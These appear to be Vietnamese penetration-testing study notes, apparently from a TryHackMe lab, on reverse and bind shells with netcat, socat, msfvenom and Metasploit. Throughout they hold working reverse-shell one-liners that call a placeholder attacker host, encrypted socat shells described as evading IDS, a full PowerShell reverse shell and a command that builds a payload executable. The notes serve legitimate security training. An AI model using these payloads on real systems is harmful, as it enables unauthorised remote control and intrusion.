
## Bảng Tóm Tắt Nội Dung

| Phần | Mô tả |
|---|---|
| [Shell là gì?](#shell-là-gì) | Giới thiệu về shell và vai trò của nó trong giao tiếp với môi trường dòng lệnh. |
| [Các loại Shell](#các-loại-shell) | Phân biệt giữa reverse shell và bind shell, cùng với các ví dụ minh họa. |
| [Netcat](#netcat) | Giới thiệu về Netcat và cách sử dụng nó để tạo reverse shell và bind shell. |
| [Kỹ thuật netcat](#kỹ-thuật-netcat) | Các kỹ thuật để ổn định và nâng cao tính năng của shell netcat bằng Python, rlwrap và Socat. |
| [Socat](#socat) | Giới thiệu về Socat và cách sử dụng nó để tạo reverse shell và bind shell, bao gồm cả các shell được mã hóa. |
| [Common Shell Payloads](#common-shell-payloads) | Các payload shell phổ biến cho cả Linux và Windows. |
| [Msfvenom](#msfvenom) | Giới thiệu về Msfvenom và cách sử dụng nó để tạo các payload khác nhau. |
| [Metasploit multi/handler](#metasploit-multihandler) | Hướng dẫn cách sử dụng Metasploit multi/handler để bắt các kết nối reverse shell. |


---

# Shell

# Shell là gì?

Nói một cách đơn giản nhất có thể, shell là thứ chúng ta sử dụng khi giao tiếp với môi trường dòng lệnh (CLI). Nói cách khác, các chương trình bash hoặc sh phổ biến trong Linux là các ví dụ về shell, cũng như cmd.exe và Powershell trên Windows.

# Các loại Shell

Ở mức độ cao, chúng ta quan tâm đến hai loại shell khi khai thác mục tiêu: **Reverse shell và bind shell**.

## R**everse shell**

- **Khi mục tiêu bị buộc phải thực thi mã kết nối ngược trở lại máy tính của bạn**.
- **Thiết lập listener trên máy của attacker.**
- **Là một cách tốt để vượt qua các quy tắc tường lửa có thể ngăn bạn kết nối với các cổng tùy ý trên mục tiêu.**

### Ví dụ

Attacker

```jsx
sudo nc -lvnp 443
```

Client

```jsx
nc <LOCAL-IP> <PORT> -e /bin/bash
```

## **Bind shell**

- **Kẻ tấn công khiến hệ thống mục tiêu mở một cổng và lắng nghe kết nối, sau đó kẻ tấn công sẽ kết nối đến cổng đó để giành quyền kiểm soát hệ thống.**

### Ví dụ

Attacker

```jsx
nc MACHINE_IP <port>
```

Client

```jsx
nc -lvnp <port> -e "cmd.exe"
```



# Netcat

Netcat là công cụ cơ bản nhất trong bộ công cụ của một pentester khi nói đến bất kỳ loại kết nối mạng nào.

## **Reverse Shell**

Cú pháp để khởi động một trình lắng nghe netcat bằng Linux

Attacker

```jsx
nc -lvnp <số cổng>
```

## **Bind Shell**

Nếu chúng ta đang tìm cách có được một bind shell trên một mục tiêu thì chúng ta có thể giả định rằng đã có một trình lắng nghe đang chờ chúng ta trên một cổng đã chọn của mục tiêu

Client

```jsx
nc <địa chỉ IP mục tiêu> <cổng đã chọn>
```

---

## Kỹ thuật netcat

Trường hợp chúng ta đã có kết nối từ client đến attacker thì chúng ta cần có biện pháp để **ổn định các shell netcat trên các hệ thống Linux.** 

### **Kỹ thuật 1: Python**

- Điều đầu tiên cần làm là sử dụng `python -c 'import pty; pty.spawn("/bin/bash")'`, sử dụng Python để tạo ra một shell bash có nhiều tính năng hơn.
- Bước hai là: `export TERM=xterm` -- điều này sẽ cung cấp cho chúng ta quyền truy cập vào các lệnh term như `clear`.
- Cuối cùng (và quan trọng nhất), chúng ta sẽ đặt shell ở chế độ nền bằng Ctrl + Z. Quay lại thiết bị đầu cuối của riêng chúng ta, chúng ta sử dụng `stty raw -echo; fg`. Điều này thực hiện hai việc: đầu tiên, nó tắt tiếng vang đầu cuối của chúng ta (điều này cung cấp cho chúng ta quyền truy cập vào tab autocompletes, các phím mũi tên và Ctrl + C để tiêu diệt các tiến trình). Sau đó, nó đưa shell lên nền trước, do đó hoàn thành quá trình.

![image.png](Shell%209036fccc25a74d9cbe863c9f4abb95c3/image.png)

### **Kỹ thuật 2: rlwrap**

rlwrap là một chương trình, nói một cách đơn giản, cung cấp cho chúng ta quyền truy cập vào lịch sử, tab autocompletion và các phím mũi tên ngay lập tức khi nhận được một shell.

Cài đặt:

```jsx
sudo apt install rlwrap
```

Để sử dụng rlwrap, chúng ta gọi một trình lắng nghe hơi khác một chút:

```jsx
rlwrap nc -lvnp <port>
```

Sau đó sử dụng lệnh sau để ổn định và vào lại shell.

```jsx
stty raw -echo; fg
```

### **Kỹ thuật 3: Socat**

Sử dụng shell netcat ban đầu làm bước đệm vào shell socat có nhiều tính năng hơn. 

### Ví dụ

Giả sử chúng ta đã điều khiển được máy mục tiêu bằng netcat nhưng bị hạn chế bởi shell không tương tác. Thì trên máy attacker tạo thư mục chứa tệp nhị phân socat của bạn, sau đó:

```jsx
sudo python3 -m http.server 80
```

Trên máy client sử dụng shell netcat để tải xuống tệp.

---

---

---

# Socat

Socat có một số điểm tương đồng với netcat, nhưng về cơ bản lại khác biệt ở nhiều điểm khác. Cách dễ nhất để nghĩ về socat là một công cụ kết nối giữa hai điểm. 

## **Reverse Shell**

**Attacker:**

```jsx
socat TCP-L:<port> -
```

**Reverse shell tty Linux: Attacker**

```jsx
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

- `FILE:`tty``: Kết nối với thiết bị đầu cuối hiện tại (`tty` là viết tắt của teletypewriter, một thiết bị đầu cuối cổ điển). Điều này cho phép bạn nhập lệnh và xem kết quả trên thiết bị đầu cuối của mình.
- `raw`: Chế độ truyền dữ liệu thô (raw), không có bất kỳ xử lý đặc biệt nào.
- `echo=0`: Tắt chế độ echo, nghĩa là những gì bạn nhập sẽ không được hiển thị lại trên thiết bị đầu cuối. Điều này hữu ích khi bạn không muốn hiển thị mật khẩu hoặc thông tin nhạy cảm khác.

```jsx
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

- `pty` phân bổ một pseudoterminal trên mục tiêu - một phần của quá trình ổn định
- `stderr`đảm bảo rằng bất kỳ thông báo lỗi nào cũng được hiển thị trong shell (thường là một vấn đề với các shell không tương tác)
- `sigint`chuyển bất kỳ lệnh Ctrl + C nào vào quy trình con, cho phép chúng ta tiêu diệt các lệnh bên trong shell
- `setsid` tạo quy trình trong một phiên mới
- `sane` ổn định terminal, cố gắng "bình thường hóa" nó.

**Client:**

Windown

```jsx
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

Linux

```jsx
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

## **Bind Shell**

**Attacker:**

```jsx
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

**Client:**

Windown

```jsx
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

Linux

```jsx
socat TCP-L:<PORT> EXEC:"bash -li"
```

## Socat Encrypted Shells

Một trong những điều tuyệt vời về socat là nó có khả năng tạo ra các shell được mã hóa - cả bind shell và reverse shell. Tại sao chúng ta lại muốn làm điều này? Các shell được mã hóa không thể bị theo dõi trừ khi bạn có khóa giải mã và thường có thể vượt qua IDS nhờ đó.

Trước tiên, chúng ta cần **tạo một chứng chỉ để sử dụng các shell được mã hóa.** Điều này dễ thực hiện nhất trên máy tấn công của chúng ta:

```jsx
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

Lệnh này tạo ra một khóa RSA 2048 bit với tệp chứng chỉ phù hợp, tự ký và có hiệu lực trong vòng chưa đầy một năm. Khi bạn chạy lệnh này, nó sẽ yêu cầu bạn điền thông tin về chứng chỉ. Bạn có thể để trống hoặc điền ngẫu nhiên.

Sau đó, chúng ta cần hợp nhất hai tệp đã tạo thành một tệp .pem duy nhất:

```jsx
cat shell.key shell.crt > shell.pem
```

### **Reverse Shell**

Bây giờ, khi chúng ta thiết lập trình lắng nghe reverse shell của mình, chúng ta sử dụng:

**Attacker**

```jsx
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```

Điều này thiết lập một trình lắng nghe OPENSSL sử dụng chứng chỉ đã tạo của chúng ta. `verify=0` yêu cầu kết nối không cần cố gắng xác thực rằng chứng chỉ của chúng ta đã được ký đúng bởi một cơ quan được công nhận. Xin lưu ý rằng chứng chỉ phải được sử dụng trên bất kỳ thiết bị nào đang lắng nghe.

Để kết nối lại, chúng ta sẽ sử dụng:

**Client**

```jsx
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

### Bind shell

**Client**

```jsx
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```

**Attacker**

```jsx
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

![image.png](Shell%209036fccc25a74d9cbe863c9f4abb95c3/image%201.png)

---

---

---

# Common Shell Payloads

## Bind shell

Client: 

```jsx
nc -lvnp <PORT> -e /bin/bash
```

```jsx
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

Attacker: 

```jsx
nc <VICTIM-IP> <PORT>
```

## Reverse Shell

Attacker:

```jsx
nc -lvnp <PORT>
```

Client:

```jsx
nc <ATTACKER-IP> <PORT> -e /bin/bash
```

```jsx
mkfifo /tmp/f; nc <ATTACKER-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

Khi nhắm mục tiêu vào một máy chủ **Windows hiện đại**, rất phổ biến là cần một reverse shell PowerShell, vì vậy chúng ta sẽ đề cập đến một lệnh PSH reverse shell đơn giản ở đây.

Lệnh này rất phức tạp, vì vậy để đơn giản hóa, nó sẽ không được giải thích chi tiết ở đây. Tuy nhiên, đây là một lệnh rất hữu ích mà bạn nên lưu giữ:

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

```

Để sử dụng lệnh này, bạn cần thay thế "<IP>" và "<port>" bằng một IP và cổng thích hợp. Sau đó, lệnh có thể được sao chép vào một cmd.exe shell (hoặc một phương pháp khác để thực thi lệnh trên máy chủ Windows, chẳng hạn như một webshell) và thực thi, kết quả là một reverse shell.

Đối với các payloads reverse shell phổ biến khác, bạn có thể tham khảo "[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)", một kho lưu trữ chứa nhiều shell codes (thường ở dạng lệnh một dòng để sao chép và dán), bằng nhiều ngôn ngữ khác nhau. Đáng để bạn đọc qua trang được liên kết để xem những gì có sẵn.

---

---

---

# Msfvenom

Msfvenom là một phần của framework Metasploit, được sử dụng để tạo mã cho các loại payload, chủ yếu là reverse shell và bind shell.

Cú pháp tiêu chuẩn cho msfvenom như sau:

```jsx
msfvenom -p <PAYLOAD> <OPTIONS>
```

Ví dụ: để tạo một Reverse Shell Windows x64 ở định dạng exe, chúng ta có thể sử dụng:

```jsx
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

Ở đây chúng ta đang sử dụng một payload và bốn tùy chọn:

- `f <format>`: Chỉ định định dạng đầu ra. Trong trường hợp này là một tệp thực thi (exe)
- `o <file>`: Vị trí và tên tệp đầu ra cho payload được tạo.
- `LHOST=<IP>`: Chỉ định địa chỉ IP để kết nối ngược lại. Khi sử dụng TryHackMe, đây sẽ là địa chỉ IP `tun0` của bạn. Nếu bạn không thể tải liên kết thì bạn chưa kết nối với VPN.
- `LPORT=<port>`: Cổng trên máy cục bộ để kết nối ngược lại. Đây có thể là bất kỳ số nào từ 0 đến 65535 chưa được sử dụng; tuy nhiên, các cổng dưới 1024 bị hạn chế và yêu cầu một trình lắng nghe chạy với quyền root.

---

---

---

# Metasploit multi/handler

**1. Mở Metasploit Console:**

- Mở terminal và gõ lệnh `msfconsole` để khởi động Metasploit Framework.

**2. Chọn mô-đun multi/handler:**

- Trong Metasploit console, gõ lệnh `use exploit/multi/handler` và nhấn Enter. Điều này sẽ tải mô-đun multi/handler để bạn có thể bắt đầu cấu hình nó.

**3. Thiết lập các tùy chọn:**

- Sử dụng lệnh `options` để xem danh sách các tùy chọn có sẵn.
- Các tùy chọn quan trọng cần thiết lập bao gồm:
    - `PAYLOAD`: Chỉ định payload cụ thể bạn muốn sử dụng (ví dụ: `windows/meterpreter/reverse_tcp`).
    - `LHOST`: Địa chỉ IP hoặc hostname của máy tấn công, nơi bạn sẽ lắng nghe kết nối từ mục tiêu.
    - `LPORT`: Cổng mà bạn sẽ lắng nghe trên máy tấn công.
- Sử dụng lệnh `set` để thiết lập giá trị cho từng tùy chọn:
    
    ```jsx
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 192.168.1.100 
    set LPORT 4444
    ```
    
    - Thay thế các giá trị trong ví dụ trên bằng thông tin thực tế của bạn.

**4. Chạy mô-đun:**

- Sử dụng lệnh `exploit -j` để chạy mô-đun ở chế độ nền (background job). Điều này cho phép bạn tiếp tục sử dụng Metasploit console trong khi chờ kết nối từ mục tiêu.

**5. Quản lý phiên:**

- Khi mục tiêu thực thi payload, Metasploit sẽ bắt kết nối và mở một phiên mới.
- Sử dụng lệnh `sessions -l` để liệt kê tất cả các phiên đang hoạt động.
- Sử dụng lệnh `sessions -i <số phiên>` để tương tác với một phiên cụ thể.